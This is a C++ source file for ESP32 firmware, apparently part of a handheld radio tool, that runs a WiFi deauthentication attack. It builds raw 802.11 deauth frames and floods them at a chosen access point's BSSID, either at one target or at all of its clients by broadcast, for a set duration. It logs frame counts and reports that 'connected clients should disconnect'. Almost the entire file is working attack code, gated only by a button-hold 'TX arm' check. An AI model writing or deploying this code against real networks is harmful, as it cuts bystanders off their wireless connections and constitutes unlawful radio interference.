#include "wifi_deauth.h"
#include "tx_arm.h"
#include "config.h"
#include <WiFi.h>
#include <esp_wifi.h>

namespace {
volatile bool g_deauthActive = false;
uint32_t g_deauthCount = 0;

struct DeauthFrame {
    uint8_t frameControl[2];
    uint8_t flags;
    uint8_t duration[2];
    uint8_t destAddr[6];
    uint8_t srcAddr[6];
    uint8_t bssidAddr[6];
    uint8_t seqControl[2];
    uint16_t reasonCode;
};

void parseMAC(const String &macStr, uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        int pos = i * 3;
        mac[i] = strtol(macStr.substring(pos, pos + 2).c_str(), nullptr, 16);
    }
}

void sendDeauthPacket(uint8_t *destAddr, uint8_t *srcAddr, uint8_t *bssidAddr) {
    uint8_t deauthPacket[28] = {
        0xC0, 0x00,  // Frame control (deauth)
        0x3A, 0x01,  // Flags
        0x00, 0x00,  // Duration
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Destination address (will be filled)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source address (will be filled)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (will be filled)
        0xF0, 0x0F,  // Sequence control
        0x02, 0x00   // Reason code (2 = PREV_AUTH_NOT_VALID)
    };

    // Set addresses
    memcpy(&deauthPacket[4], destAddr, 6);
    memcpy(&deauthPacket[10], srcAddr, 6);
    memcpy(&deauthPacket[16], bssidAddr, 6);

    // Send frame via raw WiFi interface
    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    if (res == ESP_OK) {
        g_deauthCount++;
    }
}
}

namespace WiFiDeauth {

DeauthResult sendDeauthFrames(const String &targetBSSID, uint32_t durationMs, bool broadcastClients) {
    DeauthResult result{false, 0, "", targetBSSID, durationMs};

    Serial.println("\n=== WiFi Deauth Attack ===");
    Serial.println("Target BSSID: " + targetBSSID);
    Serial.println("Duration: " + String(durationMs) + "ms");
    Serial.println("Broadcast: " + String(broadcastClients ? "YES (all clients)" : "NO (specific target)"));

    if (!TxArm::isArmed()) {
        Serial.println("✗ TX not armed (hold BACK button)");
        return result;
    }

    // Enable WiFi in monitor mode for raw frame transmission
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);

    uint8_t bssid[6];
    parseMAC(targetBSSID, bssid);

    g_deauthActive = true;
    g_deauthCount = 0;
    uint32_t startTime = millis();

    Serial.println("Starting deauth flood...");

    uint8_t srcAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};  // Broadcast source
    uint8_t destAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast dest

    while (millis() - startTime < durationMs && g_deauthActive) {
        if (broadcastClients) {
            // Send broadcast deauth to all clients
            sendDeauthPacket(destAddr, srcAddr, bssid);
        } else {
            // Send targeted deauth
            sendDeauthPacket(destAddr, bssid, bssid);
        }

        delayMicroseconds(100);  // Minimal delay between frames

        if (g_deauthCount % 50 == 0 && g_deauthCount > 0) {
            Serial.println("  [" + String(g_deauthCount) + "] deauth frames in " +
                         String(millis() - startTime) + "ms");
        }
    }

    g_deauthActive = false;
    esp_wifi_set_promiscuous(false);

    result.success = true;
    result.deauthCount = g_deauthCount;

    Serial.println("✓ Deauth attack complete");
    Serial.println("Total frames: " + String(result.deauthCount));
    Serial.println("Duration: " + String(millis() - startTime) + "ms");
    Serial.println("Rate: ~" + String((result.deauthCount * 1000) / (millis() - startTime)) + " frames/sec");
    Serial.println("⚠️  Connected clients should disconnect");

    return result;
}

void stop() {
    g_deauthActive = false;
    esp_wifi_set_promiscuous(false);
    Serial.println("Deauth attack stopped");
}

bool isActive() {
    return g_deauthActive;
}

}  // namespace WiFiDeauth
